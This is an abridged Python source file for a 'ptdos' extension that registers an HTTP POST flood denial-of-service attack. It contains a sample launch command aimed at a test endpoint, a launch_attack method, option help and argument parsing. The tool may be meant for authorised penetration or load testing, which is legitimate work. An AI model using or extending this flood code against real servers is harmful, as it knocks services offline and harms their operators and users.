"""ptdos extension that adds a HTTP POST Flood attack."""
# python3 ptdos.py -a httppostflood -d 5 -dst "http://ptsv2.com/t/9tpgk-1648998671/post" -body "{'name':'test','age':20}" -qs "par1=val1&par2=val2" -st 0.001
# test API http://ptsv2.com/t/9tpgk-1648998671
...
class HttpPostFlood:
    ...
    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        ...
        request = create_request("POST", url.hostname, query, url.path, body)
    ...
    def make_help():
        ...
        return [
            {"HTTP POST Flood attack options": [
                ["-a", "--attack", "<attack>", "Attack name - httppostflood"],
                ["-d", "--duration", "<duration>", "Attack duration in seconds. Default 10 seconds."],
                ["-dst", "--destination", "<dst>", 'Specify destination URL like "http://domain.com/test/pth".'],
                ["-body", "--body", "<body>", 'Specify body of the request like "{\'name\':\'test\',\'number\':20}".'],
                ["-qs", "--querystrings", "<query>", 'Specify request queries like field1=value1&field2=value2.'],
    ...
    def make_args(parser):
        ...
        parser.add_argument("-body", "--body", dest="body", type=str, default="")  # body of the request
        parser.add_argument("-qs", "--querystrings", dest="query", type=str, default="")  # request queries


def register() -> None:
    """Register attack in factory."""
    factory.register("httppostflood", HttpPostFlood)
